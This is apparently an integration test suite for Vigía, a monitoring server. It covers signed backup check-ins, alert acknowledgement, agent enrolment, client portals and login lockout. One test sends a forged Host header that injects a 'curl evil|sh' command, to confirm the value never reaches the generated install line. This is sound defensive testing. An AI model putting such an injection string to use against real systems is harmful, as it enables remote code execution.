// HTTP integration: starts the real server with throw-away data and talks to it like a browser, a phone and a backup job would.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { smtpMock, bodyOf, subjectOf } from './smtp-mock.mjs';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigia-it-'));
const MASTER = 'it-master-secret', PASS = 'it-pass', ACK = 'it-ack-secret';
let srv, aux, port, auxPort, smtp;
const hooks = [], prompts = [];

const freePort = () => new Promise(r => { const s = http.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });

function start(env, { waitFor = 'Vigía on' } = {}) {
  // never the developer's own .env: it may hold real alert channels
  // never the developer's own data/ either: every file a test does not name goes to a scratch folder
  const p = spawn(process.execPath, [path.join(ROOT, 'server.mjs')], { env: { PATH: process.env.PATH, VIGIA_ENV_FILE: path.join(dir, 'none.env'), VIGIA_DATA: path.join(dir, 'data'), ...env }, stdio: ['ignore', 'pipe', 'pipe'] });
  let out = '';
  const done = new Promise(res => {
    const on = d => { out += d; if (waitFor && out.includes(waitFor)) res({ p, out: () => out }); };
    p.stdout.on('data', on); p.stderr.on('data', on);
    p.on('exit', code => res({ p, code, out: () => out }));
  });
  return done;
}

before(async () => {
  [port, auxPort] = [await freePort(), await freePort()];
  // a webhook that records alerts (and their acknowledge links), plus the connectivity probe target
  aux = http.createServer((q, r) => { let b = ''; q.on('data', d => { b += d; }).on('end', () => {
    if (q.url === '/hook') hooks.push(JSON.parse(b));
    // a stand-in for Ollama: records prompts, answers with a reasoning block that Vigía must strip
    if (q.url === '/api/tags') return r.end(JSON.stringify({ models: [{ name: 'mock-model' }] }));
    if (q.url === '/api/generate') { const j = JSON.parse(b); prompts.push(j); return r.end(JSON.stringify({ response: `<think>hmm</think>Draft #${prompts.length}` })); }
    r.end('ok');
  }); }).listen(auxPort, '127.0.0.1');
  smtp = smtpMock({ user: 'mailer', pass: 'mail-pass' });
  const smtpPort = await smtp.listen();
  fs.writeFileSync(path.join(dir, 'inventory.json'), JSON.stringify([{ id: 'shop', client: 'ACME', name: 'Shop', url: `http://127.0.0.1:${auxPort}/`, criticality: 'high', backups: [{ id: 'db' }] }]));
  ({ p: srv } = await start({
    PORT: String(port), DASH_PASS: PASS, CHECKIN_SECRET: MASTER, ACK_SECRET: ACK, PUBLIC_URL: `http://127.0.0.1:${port}`, CANARY_DAYS: '0',
    WEBHOOK_URL: `http://127.0.0.1:${auxPort}/hook`, CONNECTIVITY_URLS: `http://127.0.0.1:${auxPort}/ok`,
    OLLAMA_MODEL: 'mock-model', OLLAMA_URL: `http://127.0.0.1:${auxPort}`,
    SMTP_HOST: '127.0.0.1', SMTP_PORT: String(smtpPort), SMTP_USER: 'mailer', SMTP_PASS: 'mail-pass', MAIL_FROM: 'Vigía <vigia@it.example>', MAIL_TO: 'tech@it.example, boss@it.example',
    VIGIA_INV: path.join(dir, 'inventory.json'), VIGIA_STATE: path.join(dir, 'state.json'), VIGIA_PUSHED: path.join(dir, 'pushed.json'), VIGIA_WORDFENCE: path.join(dir, 'wf.json'),
    VIGIA_CLIENTS: path.join(dir, 'clients.json'), VIGIA_CLIENT_MAIL_MS: '150', VIGIA_CLIENT_GAP_MS: '300', PUBLIC_IP_URL: 'off', VIGIA_EXPOSURE_ALLOW_PRIVATE: 'true',
  }));
});
after(() => { srv?.kill(); aux?.close(); smtp?.server.close(); fs.rmSync(dir, { recursive: true, force: true }); });

const url = p => `http://127.0.0.1:${port}${p}`;
const auth = { authorization: `Basic ${Buffer.from(`vigia:${PASS}`).toString('base64')}`, 'x-vigia-ui': '1' };
const sign = (key, ts, p, body) => crypto.createHmac('sha256', key).update(`${ts}.${p}.${body}`).digest('hex');
async function checkin(key, status, body = '', ts = Math.floor(Date.now() / 1000)) {
  const p = `/api/backup/shop/db?status=${status}`;
  const r = await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts), 'x-vigia-signature': sign(key, ts, p, body) }, body });
  return r.status;
}
const assetKey = crypto.createHmac('sha256', MASTER).update('vigia-asset:shop').digest('hex');

test('refuses to listen beyond localhost without a password, before touching any data file', async () => {
  const data = path.join(dir, 'refused');
  fs.mkdirSync(data);
  fs.writeFileSync(path.join(data, 'pushed.json'), '{"pc":{"at":1}}');
  const r = await start({ PORT: String(await freePort()), HOST: '0.0.0.0', VIGIA_DATA: data }, { waitFor: null });
  assert.equal(r.code, 1);
  assert.match(r.out(), /Refusing to listen/);
  assert.deepEqual(fs.readdirSync(data), ['pushed.json'], 'nothing created');
  assert.equal(fs.readFileSync(path.join(data, 'pushed.json'), 'utf8'), '{"pc":{"at":1}}', 'nothing changed');
});

test('dashboard: password, data never cached, static shell public', async () => {
  assert.equal((await fetch(url('/'))).status, 401);
  assert.equal((await fetch(url('/app.js'))).status, 200);
  const r = await fetch(url('/api/state'), { headers: auth });
  assert.equal(r.status, 200);
  assert.equal(r.headers.get('cache-control'), 'no-store');
  assert.ok(!/unsafe-inline/.test(r.headers.get('content-security-policy').match(/script-src[^;]*/)[0]));
  assert.equal((await fetch(url('/api/ack?key=x'), { method: 'POST', headers: { authorization: auth.authorization } })).status, 403, 'CSRF header required');
});

test('check-ins: per-asset key only, and A-B-A replays are rejected', async () => {
  assert.equal(await checkin(MASTER, 'start'), 401, 'master secret is off by default');
  const t = Math.floor(Date.now() / 1000);
  assert.equal(await checkin(assetKey, 'start', '', t), 200);
  assert.equal(await checkin(assetKey, 'success', '{"bytes":10}', t + 1), 200);
  assert.equal(await checkin(assetKey, 'start', '', t), 409, 'older call replayed after a newer one');
});

test('acknowledge links: bound to the alert, expiring, tamper-proof', async () => {
  assert.equal(await checkin(assetKey, 'fail', '{"message":"disk full"}', Math.floor(Date.now() / 1000) + 2), 200);
  let hook;
  for (let i = 0; i < 50 && !(hook = hooks.find(h => h.key === 'backup:failed:shop/db')); i++) await new Promise(r => setTimeout(r, 100));
  assert.ok(hook?.ackUrl, 'the P1 carries a signed link');
  const link = new URL(hook.ackUrl);
  assert.equal((await fetch(link)).status, 200);
  const tampered = new URL(link); tampered.searchParams.set('e', String(Date.now() + 365 * 864e5));
  assert.equal((await fetch(tampered)).status, 410);
  const expired = new URL(link); expired.searchParams.set('e', '1');
  assert.equal((await fetch(expired)).status, 410);
  assert.equal((await fetch(link, { method: 'POST' })).status, 200);
  const st = await (await fetch(url('/api/state'), { headers: auth })).json();
  assert.equal(st.alerts.find(a => a.key === 'backup:failed:shop/db').ack, true);
});

test('test alert tells the truth about delivery', async () => {
  const r = await fetch(url('/api/test'), { method: 'POST', headers: auth });
  assert.equal(r.status, 200);
  assert.equal((await r.json()).sent, 2, 'webhook and e-mail');
  const mail = smtp.mails.at(-1);
  assert.deepEqual(mail.to, ['tech@it.example', 'boss@it.example']);
  assert.match(subjectOf(mail), /^P1 Vigía/);
  assert.match(mail.data, /^X-Priority: 1$/m);
  assert.match(bodyOf(mail), /Dashboard: http:\/\/127\.0\.0\.1/);
});

test('computers: install line, enrolment, signed Windows inventory, findings', async () => {
  const J = { ...auth, 'content-type': 'application/json' };
  assert.equal((await fetch(url('/api/enroll-token'), { method: 'POST', headers: { authorization: auth.authorization }, body: '{}' })).status, 403, 'CSRF header required');
  const t = await (await fetch(url('/api/enroll-token'), { method: 'POST', headers: J, body: JSON.stringify({ client: 'Gestoría Ruiz' }) })).json();
  assert.match(t.commands.unix, /^curl -fsSL http:\/\/127\.0\.0\.1:\d+\/agent\/install\.sh \| sudo sh -s -- http/);
  assert.ok(t.commands.windows.includes(`$env:VIGIA_TOKEN='${t.token}'`));
  for (const f of ['install.sh', 'vigia-collect.sh', 'vigia-agent.ps1']) assert.equal((await fetch(url(`/agent/${f}`))).status, 200, `${f} is public`);
  assert.equal((await fetch(url('/agent/../.env'))).status, 401);

  const machineId = crypto.createHash('sha256').update('guid-1').digest('hex');
  const enroll = body => fetch(url('/api/enroll'), { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
  assert.equal((await enroll({ token: `${t.token}x`, host: 'PC-1', machineId })).status, 401);
  const r = await enroll({ token: t.token, host: 'RECEPCION', machineId, platform: 'windows' });
  assert.equal(r.status, 201);
  const e = await r.json();
  assert.equal(e.asset, 'gestoria-ruiz-recepcion');
  assert.equal(e.key, crypto.createHmac('sha256', MASTER).update(`vigia-asset:${e.asset}`).digest('hex'));
  const again = await (await enroll({ token: t.token, host: 'RECEPCION', machineId })).json();
  assert.deepEqual([again.asset, again.created], [e.asset, false], 'the same computer twice is one asset');

  // the client wants their own notices by e-mail
  const C = url(`/api/clients/${encodeURIComponent('Gestoría Ruiz')}`);
  assert.equal((await fetch(C, { method: 'PUT', headers: J, body: JSON.stringify({ emails: 'jefe@ruiz.example, nope' }) })).status, 422);
  assert.equal((await fetch(C, { method: 'PUT', headers: J, body: JSON.stringify({ emails: 'jefe@ruiz.example', minPrio: 'P2' }) })).status, 200);
  assert.equal((await fetch(url('/api/clients/Nadie'), { method: 'PUT', headers: J, body: '{}' })).status, 404);

  const body = JSON.stringify({ host: 'RECEPCION', parts: [
    { kind: 'os', id: 'windows', productName: 'Windows 10 Pro', displayVersion: '22H2', build: 19045, edition: 'Professional' },
    { kind: 'av', products: [] },
    { kind: 'software', items: [{ name: 'WinRAR 6.02 (64-bit)', version: '6.02' }, { name: 'Notepad', version: '1' }] },
    { kind: 'listening', ports: [{ proto: 'tcp', addr: '0.0.0.0', port: 3389, process: 'svchost' }] },
    { kind: 'patches', lastInstalled: new Date(Date.now() - 120 * 864e5).toISOString(), id: 'KB1' },
  ] });
  const p = `/api/inventory/${e.asset}`, ts = Math.floor(Date.now() / 1000);
  const pr = await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts), 'x-vigia-signature': sign(e.key, ts, p, body) }, body });
  assert.equal(pr.status, 200);
  assert.equal((await pr.json()).software, 2);
  let S;
  for (let i = 0; i < 40; i++) {
    S = await (await fetch(url('/api/state'), { headers: auth })).json();
    if (S.alerts.some(a => a.key === `mach:av:${e.asset}`)) break;
    await new Promise(res => setTimeout(res, 100));
  }
  const keys = S.alerts.filter(a => a.asset === e.asset).map(a => `${a.key.split(':').slice(0, 2).join(':')}:${a.prio}`);
  for (const k of ['mach:av:P2', 'mach:patch:P2', 'mach:risky:P3', 'enroll:']) assert.ok(keys.some(x => x.startsWith(k)), `${k} in ${keys}`);
  const a = S.inventory.find(x => x.id === e.asset);
  assert.deepEqual([a.client, a.machine, a.criticality], ['Gestoría Ruiz', 'RECEPCION', 'medium']);
  assert.equal(S.pushed[e.asset].machine.os, 'Windows 10 22H2 (Professional)');
  assert.equal(S.pushed[e.asset].machine.listening[0].port, 3389);
  assert.equal(S.notify.email, true);

  // one e-mail to the client, without acknowledge links, with only their own alerts
  let toClient = [];
  for (let i = 0; i < 30 && !toClient.length; i++) { await new Promise(res => setTimeout(res, 100)); toClient = smtp.mails.filter(m => m.to.includes('jefe@ruiz.example')); }
  assert.equal(toClient.length, 1, 'batched into one');
  const text = bodyOf(toClient[0]);
  assert.match(text, /has no active antivirus/);
  assert.match(text, /Your IT team has been notified/);
  assert.ok(!/api\/ack/.test(text) && !/ACME/.test(text));
  assert.ok(!toClient[0].to.includes('tech@it.example'));

  // a later push without antivirus or patch data leaves those alerts open
  const partial = JSON.stringify({ host: 'RECEPCION', parts: [{ kind: 'os', id: 'windows', productName: 'Windows 10 Pro', displayVersion: '22H2', build: 19045 }] });
  const ts2 = ts + 1;
  assert.equal((await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts2), 'x-vigia-signature': sign(e.key, ts2, p, partial) }, body: partial })).status, 200);
  await new Promise(res => setTimeout(res, 1200));
  S = await (await fetch(url('/api/state'), { headers: auth })).json();
  assert.ok(S.alerts.some(x => x.key === `mach:av:${e.asset}`), 'still open');

  // fixed: the client hears it, including the update alert that closes quietly for you
  const healthy = JSON.stringify({ host: 'RECEPCION', parts: [
    { kind: 'av', products: [{ name: 'Microsoft Defender', enabled: true, realTime: true, upToDate: true }] },
    { kind: 'patches', lastInstalled: new Date().toISOString() }, { kind: 'listening', ports: [] }] });
  const ts3 = ts + 2;
  assert.equal((await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts3), 'x-vigia-signature': sign(e.key, ts3, p, healthy) }, body: healthy })).status, 200);
  let fixed = [];
  for (let i = 0; i < 40 && fixed.length < 2; i++) { await new Promise(res => setTimeout(res, 100)); fixed = smtp.mails.filter(m => m.to.includes('jefe@ruiz.example')); }
  const resolvedText = bodyOf(fixed[1]);
  assert.match(resolvedText, /\[Resolved\] RECEPCION has no active antivirus/);
  assert.match(resolvedText, /\[Resolved\] RECEPCION without Windows updates/);
  assert.ok(!/risky/.test(resolvedText), 'a P3 they were never told about is not news');

  // the address ends up in a shell command: a forged Host header never gets there (PUBLIC_URL wins; without it, anything but a plain URL is refused)
  const bad = await new Promise(res => http.request({ host: '127.0.0.1', port, path: '/api/enroll-token', method: 'POST',
    headers: { ...J, host: "x';curl evil|sh;'" } }, r => { let d = ''; r.on('data', c => { d += c; }).on('end', () => res(d)); }).end(JSON.stringify({ client: 'A' })));
  assert.ok(!bad.includes('evil'));
});

test('Internet exposure: only the ports the computer listens on, open ones alert, acknowledging accepts', async () => {
  const J = { ...auth, 'content-type': 'application/json' };
  const t = await (await fetch(url('/api/enroll-token'), { method: 'POST', headers: J, body: JSON.stringify({ client: 'ACME' }) })).json();
  const machineId = crypto.createHash('sha256').update('guid-srv').digest('hex');
  const e = await (await fetch(url('/api/enroll'), { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ token: t.token, host: 'SRV', machineId }) })).json();
  const closed = await freePort(), p = `/api/inventory/${e.asset}`;
  const push = async (ts, ports) => {
    const body = JSON.stringify({ host: 'SRV', parts: [{ kind: 'network', publicIp: '127.0.0.1' },
      { kind: 'listening', ports: ports.map(port => ({ proto: 'tcp', addr: '0.0.0.0', port, process: 'node' })) }] });
    return (await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts), 'x-vigia-signature': sign(e.key, ts, p, body) }, body })).status;
  };
  const ts = Math.floor(Date.now() / 1000);
  assert.equal(await push(ts, [auxPort, closed]), 200);
  const key = `expo:${e.asset}:${auxPort}`;
  let S;
  for (let i = 0; i < 40; i++) { S = await (await fetch(url('/api/state'), { headers: auth })).json(); if (S.alerts.some(a => a.key === key)) break; await new Promise(r => setTimeout(r, 100)); }
  const al = S.alerts.find(a => a.key === key);
  assert.ok(al, 'the open port alerts');
  assert.equal(al.prio, 'P3');
  assert.match(al.title, /reachable from the Internet \(127\.0\.0\.1:\d+\)/);
  assert.ok(!S.alerts.some(a => a.key === `expo:${e.asset}:${closed}`), 'the closed port does not');
  assert.deepEqual(S.pushed[e.asset].machine.exposed, [auxPort]);
  // acknowledging accepts it: the next push does not raise it again
  await fetch(url(`/api/ack?key=${encodeURIComponent(key)}`), { method: 'POST', headers: auth });
  assert.equal(await push(ts + 1, [auxPort, closed]), 200);
  await new Promise(r => setTimeout(r, 1200));
  S = await (await fetch(url('/api/state'), { headers: auth })).json();
  assert.ok(!S.alerts.some(a => a.key === key));
  await fetch(url(`/api/assets/${e.asset}`), { method: 'DELETE', headers: J, body: JSON.stringify({ rev: (await (await fetch(url('/api/inventory'), { headers: auth })).json()).rev }) });
});

test('client portal: signed link, only that client, report, revocable', async () => {
  const J = { ...auth, 'content-type': 'application/json' }, C = url(`/api/clients/${encodeURIComponent('Gestoría Ruiz')}`);
  const { url: link } = await (await fetch(`${C}/portal`, { method: 'POST', headers: J, body: '{}' })).json();
  assert.match(link, /\/portal\/[A-Za-z0-9_-]+\.1\.[0-9a-f]{32}$/);
  const r = await fetch(link);
  assert.equal(r.status, 200);
  assert.equal(r.headers.get('cache-control'), 'no-store');
  assert.match(r.headers.get('x-robots-tag'), /noindex/);
  const page = await r.text();
  assert.match(page, /Gestoría Ruiz/);
  assert.match(page, /RECEPCION/);
  assert.match(page, /antivirus: Microsoft Defender/);
  assert.ok(!/ACME|Shop|enroll/.test(page), 'nothing about other clients or Vigía internals');
  const S = await (await fetch(url('/api/state'), { headers: auth })).json();
  assert.equal(S.clients['Gestoría Ruiz'].portal, link);
  const rep = await fetch(`${link}/report?month=${new Date().toISOString().slice(0, 7)}`);
  assert.equal(rep.status, 200);
  assert.match(await rep.text(), /Computers and servers/);
  assert.equal((await fetch(`${link}/../../api/state`)).status, 401, 'the link opens nothing else');

  // a new link retires the old one; turning it off retires both
  const { url: link2 } = await (await fetch(`${C}/portal`, { method: 'POST', headers: J, body: '{}' })).json();
  assert.equal((await fetch(link)).status, 404);
  assert.equal((await fetch(link2)).status, 200);
  await fetch(`${C}/portal`, { method: 'POST', headers: J, body: JSON.stringify({ action: 'revoke' }) });
  assert.equal((await fetch(link2)).status, 404);
  assert.equal((await fetch(url('/portal/forged.1.0123456789abcdef0123456789abcdef'))).status, 404);
});


test('editing the inventory: create, validation, conflict, history copy, delete', async () => {
  const H = { ...auth, 'content-type': 'application/json' };
  let inv = await (await fetch(url('/api/inventory'), { headers: auth })).json();
  assert.ok(inv.rev && inv.edgeTypes.some(e => e.type === 'fortigate'));
  let r = await fetch(url('/api/assets'), { method: 'POST', headers: H, body: JSON.stringify({ rev: inv.rev, asset: { id: 'Bad ID', client: '' } }) });
  assert.equal(r.status, 422);
  assert.deepEqual((await r.json()).errors.map(e => e.code), ['idFormat', 'required', 'needTarget']);
  r = await fetch(url('/api/assets'), { method: 'POST', headers: H, body: JSON.stringify({ rev: inv.rev, asset: { id: 'blog', client: 'ACME', domain: 'blog.example.com', name: '', stack: [] } }) });
  assert.equal(r.status, 201);
  const { rev } = await r.json();
  const stale = await fetch(url('/api/assets/blog'), { method: 'PUT', headers: H, body: JSON.stringify({ rev: inv.rev, asset: { id: 'blog', client: 'ACME', domain: 'blog.example.com' } }) });
  assert.equal(stale.status, 409, 'an edit based on an old revision never overwrites');
  r = await fetch(url('/api/assets/blog'), { method: 'PUT', headers: H, body: JSON.stringify({ rev, asset: { id: 'renamed', client: 'ACME', domain: 'blog.example.com' } }) });
  assert.equal(r.status, 422, 'ids are immutable');
  const file = JSON.parse(fs.readFileSync(path.join(dir, 'inventory.json'), 'utf8'));
  assert.deepEqual(file.find(a => a.id === 'blog'), { id: 'blog', client: 'ACME', domain: 'blog.example.com' }, 'empty fields are not written');
  assert.ok(fs.readdirSync(path.join(dir, 'inventory-history')).length >= 1, 'the previous file is kept');
  r = await fetch(url('/api/assets/blog?x'), { method: 'DELETE', headers: H, body: JSON.stringify({ rev }) });
  assert.equal(r.status, 200);
  assert.equal(await fetch(url('/api/assets/blog'), { method: 'DELETE', headers: { authorization: auth.authorization } }).then(x => x.status), 403, 'CSRF header required for DELETE too');
});

test('maintenance windows: alerts wait until the window ends', async () => {
  const H = { ...auth, 'content-type': 'application/json' };
  // a dedicated asset with its own backup job, so no alert from earlier tests interferes
  const inv = await (await fetch(url('/api/inventory'), { headers: auth })).json();
  assert.equal((await fetch(url('/api/assets'), { method: 'POST', headers: H, body: JSON.stringify({ rev: inv.rev, asset: { id: 'nas', client: 'ACME', domain: 'nas.example.com', criticality: 'high', backups: [{ id: 'nightly' }] } }) })).status, 201);
  const now = Date.now();
  let r = await fetch(url('/api/maintenance'), { method: 'POST', headers: H, body: JSON.stringify({ from: new Date(now - 60_000).toISOString(), to: new Date(now + 3600_000).toISOString(), client: 'Nobody' }) });
  assert.equal(r.status, 422);
  r = await fetch(url('/api/maintenance'), { method: 'POST', headers: H, body: JSON.stringify({ from: new Date(now - 60_000).toISOString(), to: new Date(now + 3600_000).toISOString(), assets: ['nas'], reason: 'disk swap' }) });
  assert.equal(r.status, 201);
  const { window: w } = await r.json();
  const before = hooks.length, key = crypto.createHmac('sha256', MASTER).update('vigia-asset:nas').digest('hex');
  const p = '/api/backup/nas/nightly?status=fail', body = '{"message":"NAS offline for the swap"}', ts = Math.floor(Date.now() / 1000);
  assert.equal((await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts), 'x-vigia-signature': sign(key, ts, p, body) }, body })).status, 200);
  await new Promise(res => setTimeout(res, 800));
  const st = await (await fetch(url('/api/state'), { headers: auth })).json();
  assert.ok(st.alerts.find(a => a.key === 'backup:failed:nas/nightly')?.muted, 'kept, marked as muted');
  assert.equal(hooks.slice(before).filter(h => /nightly/.test(h.title)).length, 0, 'nothing sent during maintenance');
  assert.equal((await fetch(url(`/api/maintenance/${w.id}`), { method: 'DELETE', headers: H })).status, 200);
  let got;
  for (let i = 0; i < 60 && !(got = hooks.slice(before).find(h => /after maintenance/.test(h.title) && /nightly/.test(h.title))); i++) await new Promise(res => setTimeout(res, 100));
  assert.ok(got, 'sent when the window ended');
});

test('local AI: explain and client drafts with Vigía facts, cached, never sent', async () => {
  const st = await (await fetch(url('/api/state'), { headers: auth })).json();
  assert.equal(st.config.ai.model, 'mock-model');
  const alert = st.alerts.find(a => a.key.startsWith('backup:'));
  assert.ok(alert, 'an alert to explain');
  const before = hooks.length;
  let r = await fetch(url(`/api/ai/explain?key=${encodeURIComponent(alert.key)}&lang=es`), { method: 'POST', headers: auth });
  assert.equal(r.status, 200);
  const j = await r.json();
  assert.deepEqual([j.text, j.model, j.ai], ['Draft #1', 'mock-model', true]);
  const sent = prompts.at(-1);
  assert.equal(sent.model, 'mock-model');
  assert.equal(sent.stream, false);
  assert.match(sent.prompt, /Responde en español/);
  assert.match(sent.prompt, /"client": "ACME"/);
  assert.match(sent.prompt, /"backup": \{/);
  r = await fetch(url(`/api/ai/explain?key=${encodeURIComponent(alert.key)}&lang=es`), { method: 'POST', headers: auth });
  assert.equal((await r.json()).cached, true);
  assert.equal(prompts.length, 1, 'served from cache');
  r = await fetch(url(`/api/ai/client?key=${encodeURIComponent(alert.key)}&lang=en&regen=1`), { method: 'POST', headers: auth });
  assert.equal((await r.json()).text, 'Draft #2');
  assert.match(prompts.at(-1).prompt, /\[Your name\]/);
  assert.equal(hooks.length, before, 'nothing is sent to any channel');
  assert.equal((await fetch(url('/api/ai/decide?key=x'), { method: 'POST', headers: auth })).status, 400);
  assert.equal((await fetch(url('/api/ai/explain?key=nope'), { method: 'POST', headers: auth })).status, 404);
  assert.equal((await fetch(url(`/api/ai/explain?key=${encodeURIComponent(alert.key)}`), { method: 'POST', headers: { authorization: auth.authorization } })).status, 403, 'CSRF header required');
});

// last: it blocks this address for 10 minutes
test('ten wrong passwords block the address for a while', async () => {
  const bad = { authorization: `Basic ${Buffer.from('vigia:nope').toString('base64')}` };
  for (let i = 0; i < 10; i++) await fetch(url('/api/state'), { headers: bad });
  assert.equal((await fetch(url('/api/state'), { headers: bad })).status, 429);
});
